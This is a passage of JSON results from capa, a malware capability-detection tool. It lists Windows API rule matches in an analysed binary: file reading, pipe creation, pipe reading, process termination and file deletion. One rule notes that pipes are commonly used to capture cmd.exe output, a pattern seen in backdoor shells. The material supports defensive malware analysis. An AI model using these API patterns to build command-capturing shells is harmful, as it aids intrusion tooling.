                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651784248
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "CreateFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651784256
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "CreateFileEx"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "IoCreateFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "IoCreateFileEx"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "ZwOpenFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "ZwCreateFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "NtOpenFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "NtCreateFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "LZCreateFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "LZOpenFile"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "fopen"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "fopen64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "fdopen"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "freopen"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "open"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "api",
                                          "api": "openat"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651784256
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651784424
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651785376
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2147483648,
                                  "description": "GENERIC_READ"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "match",
                                  "match": "create or open file"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651786291
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ReadFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwReadFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "LZRead"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_read"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "set current directory": {
        "meta": {
          "name": "set current directory",
          "namespace": "host-interaction/file-system",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: set current directory\r\n    namespace: host-interaction/file-system\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n  features:\r\n    - or:\r\n      - api: System.IO.Directory::SetCurrentDirectory\r\n      - api: kernel32.SetCurrentDirectory\r\n      - api: chdir\r\n      - api: fchdir\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651784976
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Directory::SetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651785261
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "chdir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "fchdir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create pipe": {
        "meta": {
          "name": "create pipe",
          "namespace": "communication/named-pipe/create",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "Interprocess Communication",
                "Create Pipe"
              ],
              "objective": "Communication",
              "behavior": "Interprocess Communication",
              "method": "Create Pipe",
              "id": "C0003.001"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 03-02.dll_:0x10003a13"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create pipe\r\n    namespace: communication/named-pipe/create\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    mbc:\r\n      - Communication::Interprocess Communication::Create Pipe [C0003.001]\r\n    examples:\r\n      - Practical Malware Analysis Lab 03-02.dll_:0x10003a13\r\n  features:\r\n    - or:\r\n      - api: kernel32.CreatePipe\r\n      - api: kernel32.CreateNamedPipe\r\n      - api: System.IO.Pipes.AnonymousPipeClientStream::ctor\r\n      - api: System.IO.Pipes.NamedPipeClientStream::ctor\r\n      - api: System.IO.Pipes.AnonymousPipeServerStream::ctor\r\n      - api: System.IO.Pipes.AnonymousPipeServerStreamAcl::Create\r\n      - api: System.IO.Pipes.NamedPipeServerStream::ctor\r\n      - api: System.IO.Pipes.NamedPipeServerStreamAcl::Create\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651785376
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreatePipe"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651785499
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateNamedPipe"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.AnonymousPipeClientStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.NamedPipeClientStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.AnonymousPipeServerStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.AnonymousPipeServerStreamAcl::Create"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.NamedPipeServerStream::ctor"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Pipes.NamedPipeServerStreamAcl::Create"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "read pipe": {
        "meta": {
          "name": "read pipe",
          "namespace": "communication/named-pipe/read",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Communication",
                "Interprocess Communication",
                "Read Pipe"
              ],
              "objective": "Communication",
              "behavior": "Interprocess Communication",
              "method": "Read Pipe",
              "id": "C0003.003"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 14-02.exe_:0x4014C0"
          ],
          "description": "PeekNamedPipe isn't required to read from a pipe; however, pipes are often utilized to capture the output of a cmd.exe process. In a multi-thread instance, a new thread is created that calls PeekNamedPipe and ReadFile to obtain the command output.",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: read pipe\r\n    namespace: communication/named-pipe/read\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    description: PeekNamedPipe isn't required to read from a pipe; however, pipes are often utilized to capture the output of a cmd.exe process. In a multi-thread instance, a new thread is created that calls PeekNamedPipe and ReadFile to obtain the command output.\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Communication::Interprocess Communication::Read Pipe [C0003.003]\r\n    examples:\r\n      - Practical Malware Analysis Lab 14-02.exe_:0x4014C0\r\n  features:\r\n    - or:\r\n      - and:\r\n        - api: kernel32.PeekNamedPipe\r\n        - api: kernel32.ReadFile\r\n      - api: kernel32.TransactNamedPipe\r\n        description: writes and reads pipe in single operation\r\n      - api: kernel32.CallNamedPipe\r\n        description: connects, writes, and reads pipe in single operation\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651785376
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "TransactNamedPipe",
                      "description": "writes and reads pipe in single operation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CallNamedPipe",
                      "description": "connects, writes, and reads pipe in single operation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "PeekNamedPipe"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651786106
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "ReadFile"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651786291
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "terminate process": {
        "meta": {
          "name": "terminate process",
          "namespace": "host-interaction/process/terminate",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Terminate Process"
              ],
              "objective": "Process",
              "behavior": "Terminate Process",
              "method": "",
              "id": "C0018"
            }
          ],
          "references": [],
          "examples": [
            "C91887D861D9BD4A5872249B641BC9F9:0x401A77",
            "9B7CCAA2AE6A5B96E3110EBCBC4311F6:0x10010307"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: terminate process\r\n    namespace: host-interaction/process/terminate\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Process::Terminate Process [C0018]\r\n    examples:\r\n      - C91887D861D9BD4A5872249B641BC9F9:0x401A77\r\n      - 9B7CCAA2AE6A5B96E3110EBCBC4311F6:0x10010307\r\n  features:\r\n    - or:\r\n      - api: System.Diagnostics.Process::Kill\r\n      - api: System.Diagnostics.Process::WaitForExit\r\n      - api: System.Diagnostics.Process::WaitForExitAsync\r\n      - api: System.Environment::Exit\r\n      - api: System.Windows.Forms.Application::Exit\r\n      - api: exit\r\n      - api: Exit\r\n      - and:\r\n        - os: linux\r\n        - api: exit_group\r\n      - and:\r\n        - optional:\r\n          - match: open process\r\n        - or:\r\n          - api: kernel32.TerminateProcess\r\n          - api: ntdll.NtTerminateProcess\r\n          - api: kernel32.ExitProcess\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651785376
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Kill"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::WaitForExit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::WaitForExitAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Windows.Forms.Application::Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "linux"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "exit_group"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "open process"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "TerminateProcess"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651786189
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtTerminateProcess"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ExitProcess"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651803600
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Kill"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::WaitForExit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::WaitForExitAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Windows.Forms.Application::Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "linux"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "exit_group"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "open process"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "TerminateProcess"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651803810
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtTerminateProcess"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ExitProcess"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "delete file": {
        "meta": {
          "name": "delete file",
          "namespace": "host-interaction/file-system/delete",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Delete File"
              ],
              "objective": "File System",
              "behavior": "Delete File",
              "method": "",
              "id": "C0047"
            }
          ],
          "references": [],
          "examples": [
            "946A99F36A46D335DEC080D9A4371940:0x100015F0",
            "31600AD0D1A7EA615690DF111AE36C73:0x401A15",
            "563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x140001E04"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
